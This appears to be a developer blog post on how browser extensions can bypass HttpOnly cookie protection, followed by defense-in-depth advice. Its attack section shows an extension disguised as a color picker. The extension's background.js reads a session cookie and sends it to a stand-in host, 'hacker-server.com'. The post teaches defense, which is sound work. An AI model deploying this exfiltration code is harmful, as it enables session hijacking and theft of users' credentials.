---
title: "Your HttpOnly Cookie Won't Save You From Everything: The Silent Attack via Browser Extensions"
slug: your-http-only-cookie-won-t-save-you-from-everything
categories: 
    - Use Case
    - Web Application Security
    - Browser Extension
draft: false
---

What? I'm using HttpOnly, SameSite cookies, but I'm still unsure?

Let's take it easy. You did everything correctly. However, there is a little-discussed risk: browser extensions.

# Understanding Session Risk and Browser Extensions

As conscientious developers, we strive to follow best practices (I hope). You've probably already done your homework: ditched localStorage for sensitive data and protected your application's session tokens with cookies configured as HttpOnly, Secure, and SameSite.

This is excellent. It's the fundamental foundation of session security on the modern web, and it protects against the vast majority of attacks, such as XSS.

But security is a game of layers, like an onion. Today, we'll explore a deeper, more subtle layer together, one that doesn't involve a flaw in our code, but rather in the ecosystem in which our applications run: the user's own browser and the trust model of extensions.

Let's talk about how the best-kept key can be copied if the homeowner hands over a master key to a friendly-looking stranger.

# The Edge of the Fortress: Where HttpOnly Protection Ends

To understand the risk, we first need to be clear about what the HttpOnly flag actually does.

Think of it as a security rule within your "house" (your web page). The rule is clear: "No 'guest' (script running on the page) may touch the family's special cookies." This perfectly neutralizes an XSS attack, where a malicious "guest" (an injected script) attempts to steal these cookies.

The bottom line is this: **a browser extension isn't just a "guest." It's the "building manager."**

When a user installs an extension, the browser requests a series of permissions. By clicking "Accept," the user isn't just inviting the extension in; they're handing it an administrator badge with elevated privileges. With this badge, the extension can operate at a level above the "house rules," interacting directly with the browser's APIs.

# Anatomy of an Attack: A Step-by-Step Analysis

Let's look at how a seemingly harmless extension like a "Color Converter" could be used to hijack a user session.

## Step 1: The Trust Agreement (The manifest.json)

Every extension declares its needs in a manifest file. This is where the request for privileges is made.

```json
{
  "manifest_version": 3,
  "name": "Super Color Picker",
  "version": "1.0",
  "description": "Find the code for any color on your screen!",
  "background": {
    "service_worker": "background.js"
  },
  "permissions": [
    "cookies", // Permission to access the Cookie API
    "activeTab" // Permission to interact with the active tab
  ],
  "host_permissions": [
    "*://*.your-ecommerce.com/", // Specific permission for your site
    "*://*.company-dashboard.com/"
  ]
}
```

The user sees a request that seems reasonable for the extension's functionality and grants the permissions. They've given the extension the master key to read cookies on the specified domains.

## Step 2: The Behind-the-Scenes Action (The background.js)

```javascript
// Inside the extension's background.js

const TARGET_DOMAIN = "https://company-panel.com";
const COOKIE_NAME = "session_id"; // The name of your application's session cookie

// This function is called when the user accesses the target site
async function extractCookie() {
  try {
    // The chrome.cookies.get API has privileges to access cookies,
    // bypassing the HttpOnly restriction that applies only to page scripts.
    const cookie = await chrome.cookies.get({
      url: TARGET_DOMAIN,
      name: COOKIE_NAME,
    });

    if (cookie) {
      console.log("Session cookie successfully intercepted.");
      const token = cookie.value;

      // Send the token to a remote server controlled by the attacker
      fetch(`https://hacker-server.com/collector`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ domain: TARGET_DOMAIN, sessionToken: token }),
      });
    }
  } catch (error) {
    console.error("Error accessing cookie:", error);
  }
}

// Add a "listener" that triggers the function when the tab is updated
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.url?.startsWith(TARGET_DOMAIN)) {
    extractCookie();
  }
});
```

Silently and invisibly to the user, the extension uses its privileges to read the session cookie and send it to an external server. The attacker can now use this token to impersonate the user.

# An Important Distinction: Site Vulnerability vs. Compromised Environment

It's crucial to differentiate between the following scenarios:

- `XSS`: This is a **security flaw in your application**. You, the developer, are responsible for preventing it. HttpOnly is your primary mitigation tool.

- `Extension Hijacking`: This is a **compromise of the client's environment**. Your application may be perfectly secure. The problem lies in the user's trust in third-party software.

# Our Role as Developers: Creating Defense in Depth

While we can't control the extensions our users install, we can design our systems to be more resilient and limit the damage if a credential is compromised. This is called Defense in Depth.

- **Maintain Short-Lived Access Tokens**: An access token that expires in 5 to 15 minutes drastically limits an attacker's window of opportunity.

- **Consider Rotating Refresh Tokens**: Implement rotation of single-use refresh tokens. If an old token is reused, it's a warning sign that the session has been compromised, allowing you to invalidate it immediately.

- **Link the Session to Other Factors**: On critical systems, add IP address or browser fingerprint checks to detect anomalies in session usage.

# A Real-World Example: Why Banks Force You to Quit Your Browser

If all this talk about browser risks seems theoretical, let's look at what the most security-paranoid institutions—banks—do.

Have you ever wondered why banks like Itaú, and others insist that you install a "Security Module" or "Guardian" to access online banking on your computer? Why don't they trust you to simply open the website in the browser, like everyone else?

The answer is simple: they consider the default browser environment inherently insecure and hostile.

They know they have no control over the extensions you've installed, or the potential malware or keyloggers running on your machine. Their conclusion is logical and drastic: "If we can't trust the environment, we won't play in it."

These security modules do several things:

- **They attempt to create a "secure desktop," isolating the banking session from other processes.**

- **They actively monitor for known malware, keyloggers, and screen capture software.**

- **They prevent other windows from overlapping the banking window (overlay attacks).**

Essentially, instead of trying to protect an application within an environment they don't control, **they remove the application from the hostile environment.** They force the user into a "bubble of trust," a secure tunnel they manage themselves, minimizing the risks we discussed.

This is defense in depth taken to the extreme. For most of us, e-commerce, SaaS, or admin panel developers, forcing users to install a desktop application is unfeasible. But the banks' logic teaches us a valuable lesson about the importance of distrusting the customer environment and building our own layers of resilience.

# Building Trust on Solid Foundations

Securing our applications is an ongoing challenge. Configuring secure cookies with HttpOnly remains an essential and non-negotiable practice, as it protects us from the most common threat: XSS.

Understanding the risk of extensions and observing banks' strategies does not diminish the importance of these measures. On the contrary, it reinforces the need to think about security holistically. Our job is to build systems that protect our users not only from vulnerabilities in our own code, but also from risks in the ecosystem in which our applications operate.